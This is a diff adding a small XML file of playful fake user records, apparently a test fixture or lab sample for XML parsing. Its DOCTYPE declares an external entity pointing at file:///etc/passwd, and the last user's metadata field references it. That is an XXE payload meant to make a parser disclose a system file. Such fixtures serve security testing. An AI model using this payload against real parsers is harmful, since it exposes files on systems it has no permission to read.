@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<users>
+    <user>
+        <firstname>Luna</firstname>
+        <lastname>Skywalker</lastname>
+        <username>luna_sky99</username>
+        <comment>Aspiring space traveler and coffee lover</comment>
+    </user>
+    <user>
+        <firstname>Finn</firstname>
+        <lastname>Rivers</lastname>
+        <username>fantastic_ocean</username>
+        <comment>I surf the web like I surf the waves</comment>
+    </user>
+    <user>
+        <firstname>Nova</firstname>
+        <lastname>Blaze</lastname>
+        <username>nova_firestorm</username>
+        <comment>Coding by day, superhero by night</comment>
+    </user>
+    <user>
+        <firstname>Bomb</firstname>
+        <lastname>Hunter</lastname>
+        <username>crack_the_heap</username>
+        <metadata>&xxe;</metadata>
+    </user>
+</users>
